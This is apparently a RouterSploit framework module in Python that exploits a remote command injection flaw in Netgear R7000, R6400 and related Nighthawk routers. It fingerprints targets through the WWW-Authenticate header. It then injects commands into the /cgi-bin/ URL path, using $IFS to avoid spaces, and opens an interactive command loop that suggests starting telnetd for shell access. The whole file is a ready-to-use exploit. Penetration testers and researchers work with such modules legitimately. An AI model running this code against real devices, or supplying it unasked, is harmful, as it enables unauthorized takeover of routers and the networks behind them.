from routersploit import (
    exploits,
    print_status,
    print_success,
    print_error,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Netgear R7000 and R6400 Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Netgear R7000 & R6400 RCE',
        'description': 'Module exploits remote command execution in Netgear R7000 and R6400 devices. If the target is '
                       'vulnerable, command loop is invoked that allows executing commands on operating system level.',
        'authors': [
            'Chad Dougherty',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/',
            'https://www.exploit-db.com/exploits/40889/',
            'http://www.kb.cert.org/vuls/id/582384',

        ],
        'devices': [
            'R6400 (AC1750)',
            'R7000 Nighthawk (AC1900, AC2300)',
            'R7500 Nighthawk X4 (AC2350)',
            'R7800 Nighthawk X4S(AC2600)',
            'R8000 Nighthawk (AC3200)',
            'R8500 Nighthawk X8 (AC5300)',
            'R9000 Nighthawk X10 (AD7200)',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)

    def run(self):
        if self.check():
            print_success("Target is probably vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection. Try to start telnet with telnet telnetd -p '4445'")
            shell(self, architecture="armle")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        cmd = cmd.replace(" ", "$IFS")
        url = "{}:{}/cgi-bin/;{}".format(self.target, self.port, cmd)

        http_request(method="GET", url=url)
        return ""

    @mute
    def check(self):
        url = "{}:{}/".format(self.target, self.port)

        response = http_request(method="HEAD", url=url)

        if response is None:
            return False  # target is not vulnerable

        if "WWW-Authenticate" in response.headers.keys():
            if any(map(lambda x: x in response.headers['WWW-Authenticate'], ["NETGEAR R7000", "NETGEAR R6400"])):
                return True  # target is vulnerable

        return False  # target is not vulnerable
